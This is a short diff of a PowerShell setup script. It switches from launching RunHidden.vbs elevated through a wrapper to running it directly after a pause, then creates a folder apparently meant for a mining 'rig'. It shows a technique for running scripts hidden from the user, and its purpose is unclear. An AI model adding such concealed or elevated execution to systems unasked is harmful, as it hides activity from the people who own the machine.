@@ -101,12 +101,14 @@ Get-NetFirewallRule -Name *ssh*
 mv $path\RunHidden.vbs $initial_dir
 
 # Path to the PowerShell wrapper script
-$runHiddenWrapperPath = "$initial_dir\RunHidden.ps1"
+#$runHiddenWrapperPath = "$initial_dir\RunHidden.ps1"
 
 Start-Sleep -Seconds 30
 
+./RunHidden.vbs
+
 # Run the wrapper script to execute RunHidden.vbs with elevated privileges
-Start-Process powershell -ArgumentList "-File `"$runHiddenWrapperPath`" -vbsPath `"$initial_dir\RunHidden.vbs`"" -Verb runAs
+#Start-Process powershell -ArgumentList "-File `"$runHiddenWrapperPath`" -vbsPath `"$initial_dir\RunHidden.vbs`"" -Verb runAs
 
 #Create rig Folder within Folder
 New-Item -Name "$wd" -Path "$path" -ItemType Directory
